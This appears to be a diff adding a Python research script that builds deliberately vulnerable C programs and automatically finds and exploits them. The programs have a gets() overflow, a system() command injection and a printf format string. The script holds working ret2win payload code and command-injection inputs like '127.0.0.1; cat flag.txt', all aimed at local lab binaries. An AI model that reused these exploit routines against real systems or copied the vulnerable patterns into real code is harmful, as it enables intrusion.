@@ -1,0 +1,657 @@
+"""
+v028_binary_entry.src — 二进制-only 的入口发现 + 单元链真实执行验证
+
+要回答的问题
+    v027 证明“粘贴源码 → 入口 → 单元链 → 执行验证”可行，但真实比赛更常见的是
+    只给二进制。没有源码时，还能不能自己找到入口？
+
+测什么
+    B1 普通 ret2win（有符号）         → 导入 gets → 危险读入入口
+    B2 同样的题但 strip 掉符号         → 只靠字符串交叉引用定位后门
+    B3 命令注入（gets + sprintf + system） → system 调用入口
+    B4 格式化字符串（printf(buf)）      → 入口能识别，但链需要泄漏（本实验不实现）
+    N1 安全写法（fgets + 字面量格式串） → 必须判为无入口
+    N2 开 canary 的溢出题              → 有入口，保护闸门拒绝
+    N3 开 PIE 的溢出题                 → 有入口，保护闸门拒绝
+
+入口从哪里来（全部来自二进制，不读源码）
+    - 导入表：gets / strcpy / system / printf 等危险函数
+    - 调用点：printf 的格式串是不是常量（非常量 → 格式化字符串）
+    - 字符串交叉引用：谁引用了 "flag..." 路径字符串 → 后门候选函数
+    - ELF 保护：canary / PIE 决定能不能打
+
+边界
+    - 入口发现是静态特征，不做完整数据流；
+    - 格式化字符串只识别入口，利用链（泄漏 → 覆写）不在本实验；
+    - 后门定位依赖字符串引用，若后门只做计算不引用字符串则可能漏。
+
+运行
+    python versions/v028_binary_entry.src
+    python versions/v028_binary_entry.src --only B2
+    python versions/v028_binary_entry.src --seed 3
+
+产出
+    experiments/EXP-0027/{results.json,report.md,chal/}
+"""
+
+from __future__ import annotations
+
+import json
+import random
+import re
+import string
+import struct
+import subprocess
+import sys
+import time
+from dataclasses import dataclass, field
+from pathlib import Path
+
+ROOT = Path(__file__).resolve().parent.parent
+OUT_DIR = ROOT / "experiments" / "EXP-0027"
+CHAL_DIR = OUT_DIR / "chal"
+
+for _stream in (sys.stdout, sys.stderr):
+    if hasattr(_stream, "reconfigure"):
+        try:
+            _stream.reconfigure(encoding="utf-8", errors="replace")
+        except (ValueError, OSError):
+            pass
+
+
+def log(message: str) -> None:
+    print(f"[{time.strftime('%H:%M:%S')}] {message}", flush=True)
+
+
+FLAG_RE = re.compile(r"flag\{[^}\n]{1,200}\}", re.IGNORECASE)
+
+
+# --------------------------------------------------------------------------------------
+# WSL / 编译
+# --------------------------------------------------------------------------------------
+
+def wsl_path(win_path: str | Path) -> str:
+    path = Path(win_path).resolve()
+    drive = path.drive.rstrip(":").lower()
+    return f"/mnt/{drive}" + str(path)[2:].replace("\\", "/")
+
+
+def run_wsl(args: list[str], stdin_data: bytes | None = None, timeout: int = 20,
+            cwd: Path | None = None) -> tuple[int, str, str]:
+    if cwd is not None:
+        command = ["wsl", "-e", "sh", "-c", 'cd "$1" && shift && exec "$@"',
+                   "sh", wsl_path(cwd), *args]
+    else:
+        command = ["wsl", "-e", *args]
+    try:
+        done = subprocess.run(command, input=stdin_data, capture_output=True, timeout=timeout)
+    except subprocess.TimeoutExpired:
+        return 124, "", "timeout"
+    return (done.returncode,
+            done.stdout.decode("utf-8", "replace"),
+            done.stderr.decode("utf-8", "replace"))
+
+
+def compile_c(source_path: Path, binary_path: Path, flags: list[str]) -> dict:
+    rc, out, err = run_wsl(["gcc", wsl_path(source_path), "-o", wsl_path(binary_path), *flags],
+                           timeout=120)
+    return {"unit": "compile", "result": "ok" if rc == 0 else "failed",
+            "flags": flags, "rc": rc, "stderr": err.strip()[-200:]}
+
+
+# --------------------------------------------------------------------------------------
+# ELF 事实
+# --------------------------------------------------------------------------------------
+
+@dataclass
+class ElfFacts:
+    path: str
+    is_pie: bool
+    has_canary: bool
+    has_nx: bool
+    relro: str
+    symbols: dict[str, int] = field(default_factory=dict)
+    imports: set[str] = field(default_factory=set)
+    text_addr: int = 0
+    text_data: bytes = b""
+    rodata_addr: int = 0
+    rodata_data: bytes = b""
+    plt: dict[int, str] = field(default_factory=dict)
+
+
+def elf_info(path: Path) -> ElfFacts:
+    from elftools.elf.elffile import ELFFile
+
+    with open(path, "rb") as handle:
+        elf = ELFFile(handle)
+        is_pie = elf["e_type"] == "ET_DYN"
+        symbols: dict[str, int] = {}
+        imports: set[str] = set()
+        for section_name in (".symtab", ".dynsym"):
+            section = elf.get_section_by_name(section_name)
+            if section is None:
+                continue
+            for symbol in section.iter_symbols():
+                if not symbol.name:
+                    continue
+                imports.add(symbol.name)
+                if symbol["st_value"]:
+                    symbols.setdefault(symbol.name, symbol["st_value"])
+        has_canary = "__stack_chk_fail" in imports or "__stack_chk_guard" in imports
+        has_nx, relro = False, "partial"
+        for segment in elf.iter_segments():
+            if segment["p_type"] == "PT_GNU_STACK":
+                has_nx = not bool(segment["p_flags"] & 0x1)
+            if segment["p_type"] == "PT_GNU_RELRO":
+                relro = "full" if elf.get_section_by_name(".got.plt") is None else "partial"
+        text = elf.get_section_by_name(".text")
+        rodata = elf.get_section_by_name(".rodata")
+        text_addr, text_data = text["sh_addr"], text.data() if text else b""
+        rodata_addr = rodata["sh_addr"] if rodata else 0
+        rodata_data = rodata.data() if rodata else b""
+
+        # PLT 地址 → 导入函数名：识别“这次调用到底是不是 printf”。
+        # 开了 CET/BIND_NOW 的构建会把真正的桩放在 .plt.sec，地址从 0 号开始。
+        plt_map: dict[int, str] = {}
+        plt = elf.get_section_by_name(".plt")
+        plt_sec = elf.get_section_by_name(".plt.sec")
+        rela = elf.get_section_by_name(".rela.plt")
+        dynsym = elf.get_section_by_name(".dynsym")
+        if plt is not None and rela is not None and dynsym is not None:
+            stride = int(plt["sh_entsize"] or 16)
+            if plt_sec is not None:
+                base, bias = int(plt_sec["sh_addr"]), 0
+            else:
+                base, bias = int(plt["sh_addr"]), 1
+            for index, relocation in enumerate(rela.iter_relocations()):
+                symbol = dynsym.get_symbol(relocation["r_info_sym"])
+                plt_map[base + (index + bias) * stride] = symbol.name
+    return ElfFacts(path=str(path), is_pie=is_pie, has_canary=has_canary, has_nx=has_nx,
+                    relro=relro, symbols=symbols, imports=imports,
+                    text_addr=text_addr, text_data=text_data,
+                    rodata_addr=rodata_addr, rodata_data=rodata_data, plt=plt_map)
+
+
+def disassemble(facts: ElfFacts):
+    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
+
+    engine = Cs(CS_ARCH_X86, CS_MODE_64)
+    return list(engine.disasm(facts.text_data, facts.text_addr))
+
+
+# --------------------------------------------------------------------------------------
+# 入口发现（只看二进制）
+# --------------------------------------------------------------------------------------
+
+@dataclass
+class Entry:
+    category: str
+    technique: str
+    evidence: str
+    address: int | None = None
+
+
+_UNSAFE_READS = {"gets", "strcpy", "strcat", "sprintf", "scanf", "getwd"}
+_SHELLS = {"system", "popen", "execl", "execlp", "execv", "execvp"}
+
+
+def _call_target(instruction) -> int | None:
+    if instruction.mnemonic != "call":
+        return None
+    operand = instruction.op_str.strip()
+    if operand.startswith("0x"):
+        try:
+            return int(operand, 16)
+        except ValueError:
+            return None
+    return None
+
+
+def _printf_has_literal_format(facts: ElfFacts, instructions: list, index: int) -> bool:
+    """调用 printf 前若加载了 .rodata 里的格式串（含 %），就算字面量格式。"""
+    for back in range(1, 11):
+        if index - back < 0:
+            break
+        instruction = instructions[index - back]
+        if instruction.mnemonic != "lea":
+            continue
+        parts = [item.strip() for item in instruction.op_str.split(",")]
+        if len(parts) != 2 or "rip" not in parts[1]:
+            continue
+        match = re.search(r"rip ([+-]) (0x[0-9a-fA-F]+)", parts[1])
+        if not match:
+            continue
+        offset = int(match.group(2), 16)
+        if match.group(1) == "-":
+            offset = -offset
+        address = instruction.address + instruction.size + offset
+        relative = address - facts.rodata_addr
+        if 0 <= relative < len(facts.rodata_data):
+            chunk = facts.rodata_data[relative:relative + 200].split(b"\0")[0]
+            if b"%" in chunk:
+                return True
+    return False
+
+
+def detect_entries(facts: ElfFacts, instructions: list) -> list[Entry]:
+    entries: list[Entry] = []
+    imports = {name for name in facts.imports}
+
+    # 1) 命令注入：system 家族 + 有输入读取
+    shell_hits = sorted(imports & _SHELLS)
+    if shell_hits and (imports & _UNSAFE_READS or "fgets" in imports or "read" in imports):
+        entries.append(Entry(
+            "command_injection", "命令注入（system 家族 + 输入读取）",
+            f"imports={shell_hits}", None))
+
+    # 2) 格式化字符串：printf 的格式参数不是常量
+    if "printf" in imports:
+        for index, instruction in enumerate(instructions):
+            target = _call_target(instruction)
+            if target is None or facts.plt.get(target) != "printf":
+                continue
+            if not _printf_has_literal_format(facts, instructions, index):
+                entries.append(Entry(
+                    "format_string", "格式化字符串（非字面量格式参数）",
+                    f"call printf at {hex(instruction.address)}", instruction.address))
+                break
+
+    # 3) 无边界读入：gets / strcpy / sprintf 等
+    unsafe_hits = sorted(imports & _UNSAFE_READS)
+    if unsafe_hits:
+        entries.append(Entry(
+            "unsafe_copy", "栈溢出 / 无边界拷贝",
+            f"imports={unsafe_hits}", None))
+
+    # 优先级：命令注入 > 格式化串 > 溢出
+    order = {"command_injection": 0, "format_string": 1, "unsafe_copy": 2}
+    entries.sort(key=lambda entry: order[entry.category])
+    return entries
+
+
+# --------------------------------------------------------------------------------------
+# 后门定位：字符串交叉引用
+# --------------------------------------------------------------------------------------
+
+def flag_string_address(facts: ElfFacts) -> tuple[int, str] | None:
+    """在 .rodata 里找形如 flag 路径的字符串，返回虚拟地址与内容。"""
+    data = facts.rodata_data
+    for match in re.finditer(rb"[ -~]{3,200}", data):
+        text = match.group(0).decode("ascii", "ignore")
+        if "flag" not in text.lower():
+            continue
+        if not ("/" in text or text.lower().endswith(".txt")):
+            continue
+        return facts.rodata_addr + match.start(), text
+    return None
+
+
+def function_starts(instructions: list) -> list[int]:
+    starts = set()
+    for index, instruction in enumerate(instructions):
+        if instruction.mnemonic == "endbr64":
+            starts.add(instruction.address)
+        elif instruction.mnemonic == "push" and instruction.op_str == "rbp":
+            # endbr64 后的 push rbp 属于同一个函数，别把函数入口切晚
+            if index > 0 and instructions[index - 1].mnemonic == "endbr64":
+                continue
+            starts.add(instruction.address)
+    return sorted(starts)
+
+
+def xref_function(instructions: list, starts: list[int], target: int) -> int | None:
+    """找引用目标地址的指令，返回它所在函数的起始地址。"""
+    for instruction in instructions:
+        if instruction.mnemonic != "lea":
+            continue
+        parts = [item.strip() for item in instruction.op_str.split(",")]
+        if len(parts) != 2 or "rip" not in parts[1]:
+            continue
+        match = re.search(r"rip ([+-]) (0x[0-9a-fA-F]+)", parts[1])
+        if not match:
+            continue
+        offset = int(match.group(2), 16)
+        if match.group(1) == "-":
+            offset = -offset
+        address = instruction.address + instruction.size + offset
+        if address != target:
+            continue
+        enclosing = None
+        for start in starts:
+            if start <= instruction.address:
+                enclosing = start
+            else:
+                break
+        return enclosing
+    return None
+
+
+def find_win(facts: ElfFacts, instructions: list) -> dict:
+    found = flag_string_address(facts)
+    if found is None:
+        return {"ok": False, "reason": "flag_string_not_found"}
+    string_addr, text = found
+    target = xref_function(instructions, function_starts(instructions), string_addr)
+    if target is None:
+        return {"ok": False, "reason": "no_xref"}
+    name = next((symbol for symbol, address in facts.symbols.items() if address == target), None)
+    return {"ok": True, "address": target, "symbol": name,
+            "flag_string": text[-80:], "flag_string_addr": hex(string_addr)}
+
+
+# --------------------------------------------------------------------------------------
+# 单元：gadget / 偏移 / payload
+# --------------------------------------------------------------------------------------
+
+def find_gadgets(facts: ElfFacts) -> dict[str, int]:
+    instructions = disassemble(facts)
+    gadgets: dict[str, int] = {}
+    for index in range(len(instructions) - 1):
+        first, second = instructions[index], instructions[index + 1]
+        if first.mnemonic == "pop" and second.mnemonic == "ret":
+            gadgets.setdefault(f"pop {first.op_str}; ret", first.address)
+    for instruction in instructions:
+        if instruction.mnemonic == "ret":
+            gadgets.setdefault("ret", instruction.address)
+            break
+    return gadgets
+
+
+def stack_hints(facts: ElfFacts) -> list[int]:
+    instructions = disassemble(facts)
+    hints: list[int] = []
+    for instruction in instructions:
+        if instruction.mnemonic == "sub" and instruction.op_str.startswith("rsp,"):
+            try:
+                size = int(instruction.op_str.split(",")[1].strip(), 0)
+            except ValueError:
+                continue
+            for extra in (8, 16):
+                if size + extra not in hints:
+                    hints.append(size + extra)
+    return hints[:4]
+
+
+def offset_candidates(hints: list[int]) -> list[int]:
+    candidates: list[int] = []
+    for hint in hints:
+        for delta in range(-8, 25, 8):
+            value = hint + delta
+            if value > 0 and value not in candidates:
+                candidates.append(value)
+    candidates.extend(value for value in range(24, 200, 8) if value not in candidates)
+    return candidates
+
+
+# --------------------------------------------------------------------------------------
+# 链
+# --------------------------------------------------------------------------------------
+
+def solve_overflow(entry: Entry, facts: ElfFacts, binary: Path, expected: str) -> dict:
+    steps: list[dict] = [{"unit": "entry", "result": entry.category,
+                          "evidence": entry.evidence}]
+    steps.append({"unit": "elf_info", "result": "ok", "pie": facts.is_pie,
+                  "canary": facts.has_canary, "nx": facts.has_nx, "relro": facts.relro})
+    if facts.has_canary or facts.is_pie:
+        reason = "canary_present" if facts.has_canary else "pie_enabled"
+        steps.append({"unit": "protection_gate", "result": "refuse", "reason": reason})
+        return {"solved": False, "refused": True, "reason": reason, "steps": steps}
+
+    instructions = disassemble(facts)
+    win = find_win(facts, instructions)
+    steps.append({"unit": "find_win", **win})
+    if not win["ok"]:
+        return {"solved": False, "refused": True, "reason": win["reason"], "steps": steps}
+
+    gadgets = find_gadgets(facts)
+    hints = stack_hints(facts)
+    candidates = offset_candidates(hints)
+    steps.append({"unit": "find_gadgets", "result": "ok", "ret": gadgets.get("ret") is not None})
+    steps.append({"unit": "offset_candidates", "result": "ok",
+                  "hints": hints, "count": len(candidates)})
+
+    wsl_binary = wsl_path(binary)
+    for attempt, offset in enumerate(candidates, 1):
+        payload = b"A" * offset
+        if gadgets.get("ret") is not None:
+            payload += struct.pack("<Q", gadgets["ret"])
+        payload += struct.pack("<Q", win["address"])
+        rc, out, err = run_wsl([wsl_binary], stdin_data=payload, timeout=10)
+        found = FLAG_RE.search(out)
+        if found and found.group(0).lower() == expected.lower():
+            steps.append({"unit": "execute", "result": "solved", "offset": offset,
+                          "attempts": attempt, "flag": found.group(0)})
+            return {"solved": True, "refused": False, "flag": found.group(0),
+                    "offset": offset, "attempts": attempt, "steps": steps}
+    steps.append({"unit": "execute", "result": "failed"})
+    return {"solved": False, "refused": False, "reason": "no_offset_worked", "steps": steps}
+
+
+def solve_command_injection(entry: Entry, facts: ElfFacts, binary: Path,
+                            expected: str, workdir: Path) -> dict:
+    steps: list[dict] = [{"unit": "entry", "result": entry.category,
+                          "evidence": entry.evidence}]
+    payloads = [b"127.0.0.1; cat flag.txt\n", b"127.0.0.1; cat /flag\n",
+                b"127.0.0.1; cat flag\n"]
+    for payload in payloads:
+        steps.append({"unit": "craft_payload", "result": "ok",
+                      "payload": payload.decode().strip()})
+        rc, out, err = run_wsl([wsl_path(binary)], stdin_data=payload,
+                               timeout=10, cwd=workdir)
+        found = FLAG_RE.search(out)
+        if found and found.group(0).lower() == expected.lower():
+            steps.append({"unit": "execute", "result": "solved", "rc": rc,
+                          "flag": found.group(0)})
+            return {"solved": True, "refused": False, "flag": found.group(0), "steps": steps}
+    steps.append({"unit": "execute", "result": "failed"})
+    return {"solved": False, "refused": False, "reason": "payload_failed", "steps": steps}
+
+
+def solve_format_string(entry: Entry, facts: ElfFacts) -> dict:
+    steps = [{"unit": "entry", "result": entry.category, "evidence": entry.evidence},
+             {"unit": "chain_lookup", "result": "refuse",
+              "reason": "needs_leak_chain_not_implemented"}]
+    return {"solved": False, "refused": True,
+            "reason": "needs_leak_chain_not_implemented", "steps": steps}
+
+
+# --------------------------------------------------------------------------------------
+# 挑战生成
+# --------------------------------------------------------------------------------------
+
+def build_challenges(seed: int) -> list[dict]:
+    CHAL_DIR.mkdir(parents=True, exist_ok=True)
+    random.seed(seed)
+    flag = "flag{binary_" + "".join(random.choices(string.hexdigits.lower(), k=10)) + "}"
+    flag_path = CHAL_DIR / "flag.txt"
+    flag_path.write_text(flag + "\n", encoding="utf-8")
+    win_name = "grant_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
+
+    overflow_src = f"""#include <stdio.h>
+#include <unistd.h>
+
+void {win_name}(void) {{
+    FILE *f = fopen("{wsl_path(flag_path)}", "r");
+    char out[256] = {{0}};
+    if (f && fgets(out, sizeof(out), f)) printf("%s", out);
+    fflush(stdout);
+    _exit(0);
+}}
+
+int main(void) {{
+    char buf[64];
+    gets(buf);
+    puts("done");
+    return 0;
+}}
+"""
+    cmdinj_src = """#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(void) {
+    char buf[64];
+    char cmd[128];
+    gets(buf);
+    sprintf(cmd, "echo pinging %s", buf);
+    system(cmd);
+    return 0;
+}
+"""
+    format_src = """#include <stdio.h>
+
+int main(void) {
+    char buf[128];
+    if (!fgets(buf, sizeof(buf), stdin)) return 1;
+    printf(buf);
+    return 0;
+}
+"""
+    safe_src = """#include <stdio.h>
+
+int main(void) {
+    char buf[64];
+    if (!fgets(buf, sizeof(buf), stdin)) return 1;
+    printf("%s", buf);
+    return 0;
+}
+"""
+
+    cases = [
+        {"id": "B1", "kind": "overflow", "source_name": "b1_overflow.c",
+         "source": overflow_src, "binary_name": "b1",
+         "flags": ["-fno-stack-protector", "-no-pie", "-O0"], "negative": False,
+         "note": "有符号 ret2win"},
+        {"id": "B2", "kind": "overflow", "source_name": "b2_stripped.c",
+         "source": overflow_src, "binary_name": "b2",
+         "flags": ["-fno-stack-protector", "-no-pie", "-O0", "-s"], "negative": False,
+         "note": "strip 符号后的 ret2win"},
+        {"id": "B3", "kind": "cmdinj", "source_name": "b3_cmdinj.c",
+         "source": cmdinj_src, "binary_name": "b3",
+         "flags": ["-fno-stack-protector", "-no-pie", "-O0"], "negative": False,
+         "note": "命令注入（gets + sprintf + system）"},
+        {"id": "B4", "kind": "format", "source_name": "b4_format.c",
+         "source": format_src, "binary_name": "b4",
+         "flags": ["-fno-stack-protector", "-no-pie", "-O0"], "negative": False,
+         "note": "格式化字符串（只识别入口）"},
+        {"id": "N1", "kind": "safe", "source_name": "n1_safe.c",
+         "source": safe_src, "binary_name": "n1",
+         "flags": ["-O0"], "negative": True, "note": "安全写法"},
+        {"id": "N2", "kind": "overflow", "source_name": "n2_canary.c",
+         "source": overflow_src, "binary_name": "n2",
+         "flags": ["-fstack-protector-all", "-no-pie", "-O0"], "negative": True,
+         "note": "canary 必须拒绝"},
+        {"id": "N3", "kind": "overflow", "source_name": "n3_pie.c",
+         "source": overflow_src, "binary_name": "n3",
+         "flags": ["-fno-stack-protector", "-pie", "-fPIE", "-O0"], "negative": True,
+         "note": "PIE 必须拒绝"},
+    ]
+    for case in cases:
+        source_path = CHAL_DIR / case["source_name"]
+        source_path.write_text(case["source"], encoding="utf-8")
+        binary = CHAL_DIR / case["binary_name"]
+        case["binary"] = binary
+        case["compile"] = compile_c(source_path, binary, case["flags"])
+        case["expected"] = flag
+    return cases
+
+
+# --------------------------------------------------------------------------------------
+# 主流程
+# --------------------------------------------------------------------------------------
+
+def solve_case(case: dict) -> dict:
+    started = time.perf_counter()
+    facts = elf_info(case["binary"])
+    instructions = disassemble(facts)
+    entries = detect_entries(facts, instructions)
+    record = {"id": case["id"], "kind": case["kind"], "negative": case["negative"],
+              "note": case["note"], "compile": case["compile"],
+              "entries": [entry.__dict__ for entry in entries]}
+    if not entries:
+        record.update({"solved": False, "refused": True, "reason": "no_entry"})
+    else:
+        entry = entries[0]
+        if entry.category == "unsafe_copy":
+            result = solve_overflow(entry, facts, case["binary"], case["expected"])
+        elif entry.category == "command_injection":
+            result = solve_command_injection(entry, facts, case["binary"],
+                                             case["expected"], CHAL_DIR)
+        else:
+            result = solve_format_string(entry, facts)
+        record.update(result)
+    record["elapsed_ms"] = round((time.perf_counter() - started) * 1000, 1)
+    verdict = ("solved" if record.get("solved")
+               else "refused" if record.get("refused") else "failed")
+    record["verdict"] = verdict
+    log(f"{case['id']}: {verdict}"
+        f"{' (' + record.get('reason', '') + ')' if verdict != 'solved' else ''}"
+        f"  entries={[entry['category'] for entry in record['entries']]}"
+        f"  {record['elapsed_ms']} ms")
+    return record
+
+
+def write_report(results: list[dict]) -> None:
+    OUT_DIR.mkdir(parents=True, exist_ok=True)
+    attack = [item for item in results if item["id"].startswith(("B1", "B2", "B3"))]
+    negatives = [item for item in results if item["negative"]]
+    detected = [item for item in results if item["entries"]]
+    summary = {
+        "attack_total": len(attack),
+        "attack_solved": sum(1 for item in attack if item["solved"]),
+        "negative_total": len(negatives),
+        "negative_correctly_refused": sum(1 for item in negatives if item["refused"]),
+        "entries_detected": len(detected),
+        "format_entry_detected_no_chain": any(
+            item["id"] == "B4" and item["entries"] for item in results),
+        "elapsed_ms": round(sum(item["elapsed_ms"] for item in results), 1),
+    }
+    (OUT_DIR / "results.json").write_text(
+        json.dumps({"summary": summary, "cases": results}, ensure_ascii=False, indent=2),
+        encoding="utf-8")
+
+    lines = ["# EXP-0027 — 二进制-only 入口发现 + 单元链执行验证", "",
+             "## 汇总", "", "```json",
+             json.dumps(summary, ensure_ascii=False, indent=2), "```", "",
+             "## 逐题", "",
+             "| 题 | 入口 | 判定 | 链 | 耗时 |", "| --- | --- | --- | --- | --- |"]
+    for item in results:
+        entry = item["entries"][0]["category"] if item["entries"] else "无"
+        chain = " → ".join(step["unit"] for step in item.get("steps", []))
+        lines.append(f"| {item['id']} | {entry} | {item['verdict']}"
+                     f"{'（' + item.get('reason', '') + '）' if item.get('reason') else ''}"
+                     f" | {chain} | {item['elapsed_ms']} ms |")
+    lines += ["", "## 说明", "",
+              "- 入口全部来自二进制：导入表、printf 调用点、字符串交叉引用、ELF 保护；",
+              "- B2 用 `-s` 去掉符号，后门只能靠 flag 字符串的引用定位；",
+              "- B4 只验证“能识别格式化字符串入口”，利用链不在本实验；",
+              "- 负样本必须如实拒绝。"]
+    (OUT_DIR / "report.md").write_text("\n".join(lines) + "\n", encoding="utf-8")
+
+
+def main() -> None:
+    import argparse
+
+    parser = argparse.ArgumentParser(description="二进制-only 入口发现 + 执行验证")
+    parser.add_argument("--only", default=None)
+    parser.add_argument("--seed", type=int, default=20261113)
+    args = parser.parse_args()
+
+    cases = build_challenges(args.seed)
+    if args.only:
+        wanted = {item.strip() for item in args.only.split(",")}
+        cases = [case for case in cases if case["id"] in wanted]
+
+    log(f"挑战 {len(cases)} 个：{[case['id'] for case in cases]}")
+    results = [solve_case(case) for case in cases]
+    write_report(results)
+    attack = [item for item in results if item["id"].startswith(("B1", "B2", "B3"))]
+    negatives = [item for item in results if item["negative"]]
+    log(f"汇总：攻击题 {sum(1 for item in attack if item['solved'])}/{len(attack)}，"
+        f"负样本拒绝 {sum(1 for item in negatives if item['refused'])}/{len(negatives)}，"
+        f"入口识别 {sum(1 for item in results if item['entries'])}/{len(results)}")
+    log(f"报告：{OUT_DIR / 'report.md'}")
+
+
+if __name__ == "__main__":
+    main()
